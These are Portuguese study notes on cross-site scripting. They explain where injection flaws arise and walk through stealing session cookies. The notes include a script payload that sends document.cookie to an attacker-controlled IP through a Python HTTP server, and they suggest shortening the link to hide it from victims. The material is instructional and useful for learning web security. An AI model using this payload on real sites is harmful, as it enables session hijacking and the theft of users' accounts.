## O que é?

   - Injeção de código HTML em uma aplicação.


## Onde as falhsa ocorrem?

   - Campos de pesquisa, cadastro são aberturas de comunicação com o servidor. Podendo injetar código javascript na aplicação. 

   - Link gerado pelo hacker com códigos maliciosos, quando abertos por clientes da aplicação, podem enviar dados dele para o atacante. 

   - A falha é executada no browser do cliente (client side).


## Nível de Controle javascript no navegador

   - Basicamente tem acesso a todas as funcionalidades que um script tem, ou seja, controle total do navegador. Com isso, o atacante pode roubar cookies de acesso, sessão de usuário/admin, utilização de keyloggers, explorar falhas em outros plugins.


## Utilizando o XSS

   - Algumas formas de aproveitar essa vulnerabilidade

   ### Roubo de cookies

      - Basta utilizar a tag script "<script>alert(document.cookie)</script>". Pórem essa forma exibe a ação na tela de quem abrir a URL com o código malicioso.

      - Para ser mais discreto e receber a informação no computador do atacante, é preciso subir um servidor http simples em python, com o comando "python3 -m http.server 80" a porta é a sua escolha, lembrando que não pode haver outro servidor na mesma porta, portanto caso tenha um web server apache na porta 80, comando "sudo service apache2 start", ela deve ser parada com o comando "sudo service apache2 stop". 

      - Então, com o servidor criado, basta colocar no campo de busca da url onde apresenta XSS o script malicioso '<script>new Image().src="http://192.168.200.5/?="+document.cookie</script>' e apertar enter. Lembrando que o ip informado depende da máquina que estiver o servidor http e a porta deve ser a mesma informada na criação do server http. A URL que for informada, terá o cookie de acesso informado no servidor http. Com isso, se o cliente clicar no link e logar, o script enviará o cookie de acesso para o log do servidor que foi criado. 

      - Para melhorar ainda mais o ataque, é possível encurtar a url com um encurtador de url na internet para que fique menos evidente que o script malicioso será executado. 


## Observações

   - Importante checar a source page, para analisar o html, como ele é descrito. 

   - payload xss: existe na internet diversas formas diferente de tentar burlar a segurança do site com xss. Esse payload tem escritas diferentes de tags script que testam essa vulnerabilidade. 